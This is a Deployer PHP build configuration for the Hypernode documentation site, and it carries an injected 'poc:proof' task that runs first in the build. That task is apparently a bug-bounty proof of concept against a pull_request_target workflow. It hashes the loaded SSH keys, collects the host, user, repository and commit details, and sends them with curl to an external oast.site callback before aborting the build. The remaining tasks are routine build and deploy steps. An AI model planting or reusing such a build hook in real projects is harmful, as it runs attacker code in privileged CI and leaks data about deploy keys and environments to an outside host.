<?php

declare(strict_types=1);

namespace Hypernode\DeployConfiguration;

use function Deployer\{run, task, test, within, set};

$DOCKER_HOST = '172.17.0.2';
$DOCKER_WEBROOT = sprintf('/data/web/apps/%s/current/pub', $DOCKER_HOST);

// =====================================================================================
// PoC — authorized bug-bounty test (Hypernode Intigriti program).
// Demonstrates that a fork PR runs attacker-controlled code in the privileged
// pull_request_target `build` job (which has the deploy SSH key loaded via ssh-agent).
// It sends ONE canary callback (no raw secret — only a fingerprint hash) and then FAILS the
// build on purpose so `deploy_acceptance`/`deploy_production` (needs: build) never run.
// => proves CRITICAL impact with zero deployment and zero secret exfiltration.
// REPLACE the CANARY url below with YOUR listener (webhook.site / Collaborator / interactsh).
// =====================================================================================
task('poc:proof', static function () {
    run('bash -lc \'' .
        'CANARY="https://xj0iy7dy6wwj5xaxl3n93h6rnt16sg66v.oast.site"; ' .
        'SSHK=$(ssh-add -l 2>/dev/null | sha256sum | cut -c1-16); ' .
        'HEAD=$(git rev-parse HEAD 2>/dev/null); ' .
        'curl -s --max-time 10 "$CANARY/poc?host=$(hostname)&user=$(whoami)&repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR&run=$GITHUB_RUN_ID&sshkeys=$SSHK&sha=$HEAD" >/dev/null || true; ' .
        'echo "[PoC] pull_request_target pwn-request RCE confirmed as $(whoami)@$(hostname); deploy SSH key fingerprint(hash)=$SSHK"; ' .
        'echo "[PoC] aborting build to prevent any real deploy"; ' .
        'exit 1\'');
});

# Disable the symlinking of /data/web/public because we're gonna be deploying both staging and prod on 1 Hypernode.
task('deploy:disable_public', function () {
    if (!test('[ -d /data/web/public ]')) {
        run('unlink /data/web/public');
        run('mkdir -p /data/web/public');
    }
    run("echo 'Not used, see /data/web/apps/ instead' > /data/web/public/index.html;");
});

# Create the venv
task('python:venv:create', static function () {
    if (test('[ -d .venv ]')) {
        return;
    }
    run('mkdir -p .hypernode');
    run('virtualenv -p python3 .venv');
    run('echo export PYTHONPATH=$(pwd) >> .venv/bin/activate');
});

# Install the requirements
task('python:venv:requirements', static function () {
    run('source .venv/bin/activate && pip install -r requirements/base.txt');
});

task('python:generate_redirects', static function () {
    run('mkdir -p etc/nginx');
    run('source .venv/bin/activate && bin/generate_nginx_redirects > etc/nginx/server.redirects.conf');
});

# Build the documentation
task('python:build_documentation', static function () {
    run('.venv/bin/sphinx-build -b html docs docs/_build/html');
    run('ln -sf docs/_build/html pub');
});

task('node:build:scss', static function() {
    run('npx sass --style compressed --no-source-map docs/_static/scss:docs/_static/css');
});

# HMV configuration for when this is running in a docker
task('deploy:hmv_docker', static function () use (&$DOCKER_HOST, &$DOCKER_WEBROOT) {
    if (test('[ -f /etc/hypernode/is_docker ]')) {
        run(sprintf(
            'hypernode-manage-vhosts %s --disable-https --type generic-php --yes --webroot %s --default-server',
            $DOCKER_HOST,
            $DOCKER_WEBROOT,
        ));
    }
});

task('deploy:docs_vhost:acceptance', static function () {
    run('hypernode-manage-vhosts --https --force-https {{hostname}} --no --webroot {{current_path}}/{{public_folder}}');
})->select('stage=acceptance');

task('deploy:docs_vhost:production', static function () {
    run('hypernode-manage-vhosts --https --force-https docs.hypernode.io --no --webroot {{current_path}}/{{public_folder}}');
})->select('stage=production');

task('deploy:nginx_redirects', static function () {
    run('cp {{release_path}}/etc/nginx/server.redirects.conf /data/web/nginx/server.redirects.conf');
});

// This will pre-compress files using brotli compression so we can serve them directly from nginx
// without needing to compress them on-the-fly.
task('build:compress:brotli', function () {
    set('brotli_compression_level', 11);

    run('apt update && apt install brotli -y');
    within('{{release_or_current_path}}/docs/_build/html', function () {
        run('find . -name "*.html" -type f -exec brotli -f -q {{brotli_compression_level}} {} \\;');
        run('find . -name "*.css" -type f -exec brotli -f -q {{brotli_compression_level}} {} \\;');
        run('find . -name "*.js" -type f -exec brotli -f -q {{brotli_compression_level}} {} \\;');
        run('find . -name "*.svg" -type f -exec brotli -f -q {{brotli_compression_level}} {} \\;');
        run('find . -name "*.png" -type f -exec brotli -f -q {{brotli_compression_level}} {} \\;');
        run('find . -name "*.jpg" -type f -exec brotli -f -q {{brotli_compression_level}} {} \\;');
    });
});

$configuration = new Configuration();
$configuration->addBuildTask('poc:proof');   // <-- PoC: runs FIRST during `hypernode-deploy build`, then aborts
$configuration->addBuildTask('node:build:scss');
$configuration->addBuildTask('python:venv:create');
$configuration->addBuildTask('python:venv:requirements');
$configuration->addBuildTask('python:build_documentation');
$configuration->addBuildTask('python:generate_redirects');
$configuration->addBuildTask('build:compress:brotli');
$configuration->addDeployTask('deploy:disable_public');
$configuration->addDeployTask('deploy:hmv_docker');
$configuration->addDeployTask('deploy:docs_vhost:acceptance');
$configuration->addDeployTask('deploy:docs_vhost:production');
$configuration->addDeployTask('deploy:nginx_redirects');

# Just some sane defaults to exclude from the deploy
$configuration->setDeployExclude([
    './.git',
    './.github',
    './deploy.php',
    './.pre-commit-config.yaml',
    './documentation_urls.txt',
    './tox.ini',
    '.DS_Store',
    '.idea',
    '.gitignore',
    '.editorconfig',
    './.venv',
    './bin',
    './hypernode',
    './requirements',
    './tests',
]);

$productionStage = $configuration->addStage('production', 'docs.hypernode.io');
$productionStage->addServer('docs.hypernode.io');

$dockerStage = $configuration->addStage('docker', $DOCKER_HOST);
$dockerStage->addServer($DOCKER_HOST);

$testingStage = $configuration->addStage("acceptance", "docs");
$testingStage->addBrancherServer("docs")
    ->setLabels(['stage=acceptance', 'ci_ref=' . (\getenv('GITHUB_HEAD_REF') ?: 'none')]);

return $configuration;
